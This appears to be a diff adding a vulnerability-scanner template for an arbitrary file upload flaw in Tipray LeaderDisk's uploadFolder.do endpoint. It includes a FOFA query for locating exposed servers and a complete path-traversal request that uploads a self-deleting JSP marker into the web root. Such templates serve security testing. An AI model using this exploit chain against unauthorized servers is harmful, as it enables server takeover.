@@ -1,0 +1,40 @@
+id: tianruilvdun-uploadfolder-fileupload
+
+info:
+  name: 天锐绿盘云文档安全管理 uploadFolder.do 任意文件上传漏洞
+  author: Superhero
+  severity: high
+  verified: true
+  description: |-
+    fofa: body="/lddsm/" || title="天锐绿盘" || title=="Tipray LeaderDisk" || body="location.href=location.href+\"lddsm\""
+    天锐绿盘云文档安全管理 uploadFolder.do 接口存在任意文件上传漏洞，未经身份攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。
+  reference:
+    - https://mp.weixin.qq.com/s/ZYIzxnSoCnDyseN12txeDA
+  tags: tianruilvdun,fileupload
+  created: 2026/02/03
+
+set:
+  username: randomLowercase(6)
+  rboundary: randomLowercase(8)
+  rbody: randomLowercase(32)
+rules:
+  r0:
+    request:
+      method: POST
+      path: /lddsm/service/../admin/activiti/uploadFolder.do?taskId=../webapps/ROOT/&relativepath=1&path=1
+      headers:
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+      body: |-
+        ------WebKitFormBoundary{{rboundary}}
+        Content-Disposition: form-data; name="file"; filename="{{username}}.jsp"
+        Content-Type: image/png
+
+        <% out.println("{{rbody}}"); new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+        ------WebKitFormBoundary{{rboundary}}--
+    expression: true
+  r1:
+    request:
+      method: GET
+      path: /{{username}}.jsp
+    expression: response.status == 200 && response.body.bcontains(bytes(rbody))
+expression: r0() && r1()
